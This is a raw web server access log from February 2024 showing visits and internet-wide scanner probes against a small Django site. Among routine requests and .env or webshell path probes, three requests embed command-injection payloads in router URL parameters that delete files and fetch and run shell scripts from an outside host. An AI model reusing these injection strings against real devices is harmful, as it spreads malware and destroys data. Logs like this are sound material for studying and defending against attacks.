143.110.222.166 - - [22/Feb/2024:18:08:01 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
186.156.119.154 - - [22/Feb/2024:18:12:40 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [22/Feb/2024:18:12:41 +0000] "GET /favicon.ico HTTP/1.1" 400 154 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
185.224.128.55 - - [22/Feb/2024:21:51:29 +0000] "GET / HTTP/1.1" 500 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
89.190.156.234 - - [22/Feb/2024:22:14:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 502 166 "http://147.182.168.239:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.42.209 - - [22/Feb/2024:22:31:21 +0000] "GET / HTTP/1.1" 502 166 "-" "-"
143.110.222.166 - - [22/Feb/2024:23:08:00 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
186.156.119.154 - - [22/Feb/2024:23:11:50 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [22/Feb/2024:23:11:50 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [22/Feb/2024:23:11:50 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [22/Feb/2024:23:11:50 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [22/Feb/2024:23:12:14 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [22/Feb/2024:23:12:14 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
35.203.211.19 - - [22/Feb/2024:23:19:40 +0000] "GET / HTTP/1.1" 200 2826 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.224.128.55 - - [22/Feb/2024:23:56:49 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [23/Feb/2024:00:07:38 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
190.211.252.66 - - [23/Feb/2024:00:14:54 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
106.75.60.18 - - [23/Feb/2024:00:56:59 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
79.106.232.116 - - [23/Feb/2024:01:06:22 +0000] "GET / HTTP/1.1" 200 2826 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
143.110.222.166 - - [23/Feb/2024:01:24:29 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [23/Feb/2024:02:12:10 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.180.143.7 - - [23/Feb/2024:02:29:26 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
167.248.133.188 - - [23/Feb/2024:02:35:18 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
167.248.133.188 - - [23/Feb/2024:02:35:23 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.188 - - [23/Feb/2024:02:35:23 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
143.110.222.166 - - [23/Feb/2024:03:19:56 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
95.214.235.169 - - [23/Feb/2024:03:34:40 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [23/Feb/2024:03:34:41 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:51 +0000] "GET /admin HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:51 +0000] "GET /admin/ HTTP/1.1" 200 2195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:51 +0000] "GET /static/admin/css/base.9f65b5cd54b3.css HTTP/1.1" 403 196 "http://147.182.168.239/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:51 +0000] "GET /static/admin/css/dark_mode.e18e9a052429.css HTTP/1.1" 403 196 "http://147.182.168.239/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:51 +0000] "GET /static/admin/css/nav_sidebar.dd925738f4cc.css HTTP/1.1" 403 196 "http://147.182.168.239/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:51 +0000] "GET /static/admin/js/nav_sidebar.3b9190d420b1.js HTTP/1.1" 403 196 "http://147.182.168.239/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:51 +0000] "GET /static/admin/css/dashboard.e90f2068217b.css HTTP/1.1" 403 196 "http://147.182.168.239/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:51 +0000] "GET /static/admin/css/responsive.eafb93ff084c.css HTTP/1.1" 403 196 "http://147.182.168.239/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:51 +0000] "GET /static/admin/js/theme.ab270f56bb9c.js HTTP/1.1" 403 196 "http://147.182.168.239/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:59 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:59 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:59 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:04:05:59 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
57.129.23.166 - - [23/Feb/2024:04:06:57 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [23/Feb/2024:04:06:57 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [23/Feb/2024:04:07:00 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
190.211.252.66 - - [23/Feb/2024:04:10:06 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
185.224.128.200 - - [23/Feb/2024:04:42:35 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [23/Feb/2024:05:00:54 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
139.162.245.23 - - [23/Feb/2024:05:19:17 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
57.129.23.166 - - [23/Feb/2024:05:53:59 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [23/Feb/2024:05:53:59 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:56:28 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:56:29 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:56:29 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:56:29 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:56:30 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:56:30 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:56:30 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:56:30 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:58:14 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:58:14 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:58:14 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:58:14 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:58:15 +0000] "GET / HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:58:16 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:58:16 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:05:58:16 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:06:00:26 +0000] "GET /static/css/panelAdmin/baseAdmin.77e2c095c12f.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
186.156.119.154 - - [23/Feb/2024:06:00:26 +0000] "GET /static/css/menu/base.fabbe6d3f7ba.css HTTP/1.1" 403 196 "http://147.182.168.239/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
104.199.31.214 - - [23/Feb/2024:06:07:26 +0000] "GET / HTTP/1.1" 200 1267 "-" "python-requests/2.31.0"
143.110.222.166 - - [23/Feb/2024:06:20:16 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
95.214.235.169 - - [23/Feb/2024:06:29:30 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [23/Feb/2024:06:29:30 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [23/Feb/2024:06:44:27 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.208.93.143 - - [23/Feb/2024:06:59:02 +0000] "GET / HTTP/1.1" 200 2826 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
199.45.155.34 - - [23/Feb/2024:07:02:33 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
199.45.155.34 - - [23/Feb/2024:07:02:36 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.34 - - [23/Feb/2024:07:02:37 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.224.128.200 - - [23/Feb/2024:07:05:01 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.224.128.200 - - [23/Feb/2024:07:07:49 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F107.175.3.29%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
185.224.128.200 - - [23/Feb/2024:07:07:49 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F107.175.3.29%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
162.142.125.226 - - [23/Feb/2024:07:12:11 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
162.142.125.226 - - [23/Feb/2024:07:12:14 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.226 - - [23/Feb/2024:07:12:14 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
143.110.222.166 - - [23/Feb/2024:07:16:44 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
190.211.252.66 - - [23/Feb/2024:07:30:12 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
57.129.23.166 - - [23/Feb/2024:07:32:24 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [23/Feb/2024:07:32:24 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.155.88.231 - - [23/Feb/2024:08:03:34 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 zgrab/0.x"
45.79.172.21 - - [23/Feb/2024:08:04:04 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.241.236.81 - - [23/Feb/2024:08:15:17 +0000] "GET /hudson HTTP/1.1" 404 159 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [23/Feb/2024:08:20:32 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
198.199.101.88 - - [23/Feb/2024:08:22:56 +0000] "GET /druid/index.html HTTP/1.1" 404 159 "-" "Mozilla/5.0 zgrab/0.x"
57.129.23.166 - - [23/Feb/2024:08:33:01 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [23/Feb/2024:08:33:02 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.224.128.200 - - [23/Feb/2024:08:53:48 +0000] "GET /cgi-bin/webcm?getpage=../html/menus/menu2.html&var:lang=%26%20rm%20-rf%20*;%20cd%20/tmp;%20curl%20-O%20http://107.175.3.29/wtf.sh;wget%20http://107.175.3.29/wtf.sh;%20chmod%20777%20wtf.sh;%20./wtf.sh%20%26 HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
170.64.209.144 - - [23/Feb/2024:09:05:26 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.209.144 - - [23/Feb/2024:09:05:27 +0000] "GET /form.html HTTP/1.1" 404 159 "-" "curl/8.1.2"
170.64.209.144 - - [23/Feb/2024:09:05:27 +0000] "GET /upl.php HTTP/1.1" 404 159 "-" "Mozilla/5.0"
170.64.209.144 - - [23/Feb/2024:09:05:28 +0000] "GET /geoip/ HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.209.144 - - [23/Feb/2024:09:05:28 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.209.144 - - [23/Feb/2024:09:05:29 +0000] "GET /1.php HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.209.144 - - [23/Feb/2024:09:05:29 +0000] "GET /bundle.js HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.209.144 - - [23/Feb/2024:09:05:30 +0000] "GET /files/ HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.209.144 - - [23/Feb/2024:09:05:30 +0000] "GET /systembc/password.php HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.209.144 - - [23/Feb/2024:09:05:31 +0000] "GET /password.php HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
170.64.209.144 - - [23/Feb/2024:09:05:31 +0000] "GET /info.php HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [23/Feb/2024:09:13:40 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
165.154.11.181 - - [23/Feb/2024:09:14:02 +0000] "GET / HTTP/1.1" 200 2826 "-" "curl/7.29.0"
95.214.235.169 - - [23/Feb/2024:09:38:39 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [23/Feb/2024:09:38:39 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.216.149.82 - - [23/Feb/2024:09:52:19 +0000] "GET / HTTP/1.1" 200 2826 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
57.129.23.166 - - [23/Feb/2024:09:55:06 +0000] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [23/Feb/2024:09:55:06 +0000] "POST / HTTP/1.1" 403 823 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [23/Feb/2024:09:59:39 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.94.146.55 - - [23/Feb/2024:10:22:37 +0000] "GET / HTTP/1.1" 200 2826 "-" "-"
167.94.146.55 - - [23/Feb/2024:10:22:40 +0000] "GET / HTTP/1.1" 200 1267 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
